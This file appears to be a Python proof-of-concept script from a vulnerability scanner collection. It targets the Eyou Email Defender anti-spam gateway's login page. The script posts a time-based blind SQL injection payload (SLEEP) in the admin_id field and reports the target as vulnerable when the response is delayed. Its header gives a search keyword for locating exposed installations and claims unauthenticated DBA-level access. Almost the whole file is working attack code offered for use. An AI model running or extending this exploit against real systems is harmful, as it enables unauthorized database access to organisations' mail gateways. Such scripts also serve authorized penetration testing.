#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 亿邮Email Defender系统免登陆DBA注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0135406
author: Lucifer
description: google关键字"反垃圾邮件网关 - 亿邮通讯", 参数admin_id未经过滤导致SQL注入，DBA权限。
'''
import sys
import time
import json
import requests
import warnings
from termcolor import cprint

class eyou_admin_id_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = {
            "admin_id":"a' AND (SELECT * FROM (SELECT(SLEEP(6)))WAcW) AND 'oHiR'='oHiR",
            "admin_pass":"a"
            }
        vulnurl = self.url + r"/php/admin_login.php"
        start_time = time.time()
        try:
            req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                cprint("[+]存在亿邮Defender系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(payload, indent=4), "red")
                return True,vulnurl,"亿邮Email Defender系统免登陆DBA注入",payload,req.text
            else:
                cprint("[-]不存在eyou_admin_id_sqli漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = eyou_admin_id_sqli_BaseVerify(sys.argv[1])
    testVuln.run()
